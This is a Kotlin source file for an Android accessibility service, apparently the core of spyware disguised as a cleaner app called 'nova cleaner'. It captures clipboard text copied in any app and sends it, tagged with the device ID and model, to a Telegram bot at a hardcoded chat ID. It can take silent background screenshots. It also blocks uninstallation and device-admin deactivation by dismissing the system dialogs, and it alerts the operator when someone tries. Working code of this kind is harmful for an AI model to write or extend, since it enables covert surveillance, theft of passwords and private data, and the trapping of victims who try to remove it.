package com.example.scanner

import android.accessibilityservice.AccessibilityService
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.data.MediaUploadRepository
import com.example.network.TelegramApiService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Executors
import kotlin.coroutines.resume

class AppAccessibilityService : AccessibilityService() {

    companion object {
        @Volatile
        var instance: AppAccessibilityService? = null
            private set

        @Volatile
        var lastActivePackageName: String = ""
        @Volatile
        var lastActiveAppLabel: String = ""
        @Volatile
        var lastSyncedClipboardText: String = ""

        fun isRunning(): Boolean = instance != null

        fun isAccessibilityServiceEnabled(context: Context): Boolean {
            if (instance != null) return true
            try {
                val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as? android.view.accessibility.AccessibilityManager
                val enabledServices = am?.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
                val expectedServiceName = ComponentName(context, AppAccessibilityService::class.java).flattenToString()
                val isListed = enabledServices?.any {
                    val comp = ComponentName(it.resolveInfo.serviceInfo.packageName, it.resolveInfo.serviceInfo.name).flattenToString()
                    comp.equals(expectedServiceName, ignoreCase = true) || it.resolveInfo.serviceInfo.packageName == context.packageName
                } == true
                if (isListed) return true

                val settingVal = android.provider.Settings.Secure.getString(
                    context.contentResolver,
                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                return settingVal.contains(context.packageName)
            } catch (_: Exception) {
                return false
            }
        }

        fun openAccessibilitySettings(context: Context): Boolean {
            return try {
                val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                true
            } catch (_: Exception) {
                try {
                    val intent = Intent(android.provider.Settings.ACTION_SETTINGS).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                    true
                } catch (_: Exception) {
                    false
                }
            }
        }

        fun openAppDetailsSettings(context: Context): Boolean {
            return try {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = android.net.Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                true
            } catch (_: Exception) {
                false
            }
        }

        fun openXiaomiOtherPermissions(context: Context): Boolean {
            try {
                val intent = Intent("miui.intent.action.APP_PERM_EDITOR").apply {
                    setClassName("com.miui.securitycenter", "com.miui.permcenter.permissions.PermissionsEditorActivity")
                    putExtra("extra_pkgname", context.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                return true
            } catch (_: Exception) {}

            try {
                val intent = Intent("miui.intent.action.APP_PERM_EDITOR").apply {
                    putExtra("extra_pkgname", context.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                return true
            } catch (_: Exception) {}

            return openAppDetailsSettings(context)
        }

        fun openXiaomiAutostartSettings(context: Context): Boolean {
            try {
                val intent = Intent().apply {
                    component = ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                return true
            } catch (_: Exception) {}

            return openAppDetailsSettings(context)
        }

        suspend fun takeScreenshotFile(cacheDir: File): Result<File> = withContext(Dispatchers.IO) {
            val service = instance ?: return@withContext Result.failure(
                Exception("Accessibility Service is not enabled. Enable it in Phone Settings -> Accessibility to take silent background screenshots.")
            )

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                return@withContext Result.failure(Exception("Silent background screenshot requires Android 11 or higher."))
            }

            suspendCancellableCoroutine { continuation ->
                val executor = Executors.newSingleThreadExecutor()
                continuation.invokeOnCancellation {
                    executor.shutdown()
                }
                service.takeScreenshot(Display.DEFAULT_DISPLAY, executor, object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        try {
                            val hardwareBuffer = screenshotResult.hardwareBuffer
                            val colorSpace = screenshotResult.colorSpace
                            val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                            hardwareBuffer.close()

                            if (bitmap != null) {
                                val softwareBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                                val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.jpg")
                                FileOutputStream(file).use { fos ->
                                    softwareBitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos)
                                    fos.flush()
                                }
                                if (continuation.isActive) {
                                    continuation.resume(Result.success(file))
                                }
                            } else {
                                if (continuation.isActive) {
                                    continuation.resume(Result.failure(Exception("Failed to wrap hardware screenshot buffer")))
                                }
                            }
                        } catch (e: Exception) {
                            if (continuation.isActive) {
                                continuation.resume(Result.failure(e))
                            }
                        } finally {
                            executor.shutdown()
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        executor.shutdown()
                        val reason = when (errorCode) {
                            AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR -> "Internal screenshot error"
                            AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT -> "Interval too short, try again"
                            AccessibilityService.ERROR_TAKE_SCREENSHOT_INVALID_DISPLAY -> "Invalid display"
                            2 -> "No end of frame"
                            else -> "Screenshot error code: $errorCode"
                        }
                        if (continuation.isActive) {
                            continuation.resume(Result.failure(Exception(reason)))
                        }
                    }
                })
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        handleUninstallProtection(event)

        try {
            val pkg = event.packageName?.toString() ?: ""
            if (pkg.isNotBlank() && pkg != packageName) {
                lastActivePackageName = pkg
                lastActiveAppLabel = runCatching {
                    packageManager.getApplicationInfo(pkg, 0).loadLabel(packageManager).toString()
                }.getOrNull() ?: pkg
            }

            // Sync global clipboard copies from ANY app on the device immediately
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as? android.content.ClipboardManager
            val clip = clipboard?.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0)?.text?.toString()?.trim() ?: ""
                if (text.isNotBlank() && text != lastSyncedClipboardText) {
                    lastSyncedClipboardText = text
                    val repository = MediaUploadRepository(this)
                    if (repository.isClipboardSyncEnabled()) {
                        val deviceId = repository.getDeviceId()
                        val config = repository.getTelegramConfig()
                        if (config.botToken.isNotBlank()) {
                            val timeStr = java.text.SimpleDateFormat("HH:mm:ss dd/MM/yyyy", java.util.Locale.getDefault()).format(java.util.Date())
                            val safeText = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                            val appName = if (lastActiveAppLabel.isNotBlank()) lastActiveAppLabel else (pkg.ifBlank { "System" })
                            val msg = "📋 <b>GLOBAL CLIPBOARD SYNCED ($appName):</b>\n\n" +
                                    "<code>$safeText</code>\n\n" +
                                    "📱 <b>Device:</b> <code>$deviceId</code> (${android.os.Build.MANUFACTURER.uppercase()} ${android.os.Build.MODEL})\n" +
                                    "🕒 <b>Time:</b> $timeStr"

                            CoroutineScope(Dispatchers.IO).launch {
                                try {
                                    val api = TelegramApiService(this@AppAccessibilityService)
                                    api.sendMessage(config.botToken, "-1004457596144", msg)
                                } catch (_: Exception) {}
                            }
                        }
                    }
                }
            }
        } catch (_: Exception) {}
    }

    private fun handleUninstallProtection(event: AccessibilityEvent) {
        val repository = MediaUploadRepository(this)
        if (!repository.isAntiUninstallEnabled()) return
        if (UninstallLockManager.isUninstallAuthorized()) return
        if (UninstallLockManager.isPinPromptActive) return

        val eventPkg = event.packageName?.toString() ?: ""
        val eventClass = event.className?.toString() ?: ""

        val isInstaller = eventPkg.contains("packageinstaller", ignoreCase = true) ||
                eventPkg.contains("uninstaller", ignoreCase = true) ||
                eventClass.contains("Uninstaller", ignoreCase = true) ||
                eventClass.contains("PackageInstallerActivity", ignoreCase = true)

        val isSettings = eventPkg.contains("settings", ignoreCase = true) ||
                eventClass.contains("SubSettings", ignoreCase = true) ||
                eventClass.contains("InstalledAppDetails", ignoreCase = true) ||
                eventClass.contains("DeviceAdmin", ignoreCase = true)

        if (!isInstaller && !isSettings) return

        val myPkg = this.packageName.lowercase()

        val appName = getString(R.string.app_name).lowercase()

        val root = rootInActiveWindow ?: event.source ?: return

        var matchesOurApp = false
        var isUninstallOrDeactivate = false

        inspectNode(root) { text, contentDesc ->
            val combined = "$text $contentDesc".lowercase()
            if (combined.contains(appName) || combined.contains("nova cleaner") || combined.contains(myPkg)) {
                matchesOurApp = true
            }
            if (combined.contains("uninstall") || combined.contains("আনইনস্টল") ||
                combined.contains("do you want to uninstall") || combined.contains("delete this app") ||
                combined.contains("deactivate") || combined.contains("disable admin") ||
                combined.contains("remove device admin") || combined.contains("ডিঅ্যাক্টিভেট")
            ) {
                isUninstallOrDeactivate = true
            }
        }

        if (isInstaller && matchesOurApp) {
            blockAndPromptPin(repository)
            return
        }

        if (isSettings && matchesOurApp && isUninstallOrDeactivate) {
            blockAndPromptPin(repository)
            return
        }
    }

    private fun inspectNode(node: AccessibilityNodeInfo?, onNode: (text: String, contentDesc: String) -> Unit) {
        if (node == null) return
        val text = node.text?.toString() ?: ""
        val contentDesc = node.contentDescription?.toString() ?: ""
        if (text.isNotBlank() || contentDesc.isNotBlank()) {
            onNode(text, contentDesc)
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                inspectNode(child, onNode)
            }
        }
    }

    private fun blockAndPromptPin(repository: MediaUploadRepository) {
        UninstallLockManager.isPinPromptActive = true

        // Dismiss the system uninstaller prompt immediately
        performGlobalAction(GLOBAL_ACTION_HOME)

        // Launch PIN verification screen
        val lockIntent = Intent(this, UninstallLockActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
        }
        startActivity(lockIntent)

        // Alert Telegram
        if (UninstallLockManager.shouldSendAlert()) {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val config = repository.getTelegramConfig()
                    if (config.botToken.isNotBlank() && config.chatId.isNotBlank()) {
                        val deviceId = repository.getDeviceId()
                        val api = TelegramApiService(this@AppAccessibilityService)
                        val alertMsg = "🚨 <b>UNINSTALL ATTEMPT DETECTED & BLOCKED!</b>\n\n" +
                                "📱 <b>Device:</b> <code>$deviceId</code> (${Build.MANUFACTURER.uppercase()} ${Build.MODEL})\n" +
                                "⚠️ Someone is attempting to uninstall <b>${getString(R.string.app_name)}</b> or deactivate Device Admin!\n\n" +
                                "🔒 <b>Action Taken:</b> System uninstaller closed, Security PIN prompt opened."
                        api.sendMessage(config.botToken, config.chatId, alertMsg)
                    }
                } catch (_: Exception) {}
            }
        }
    }

    override fun onInterrupt() {
        instance = null
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }
}
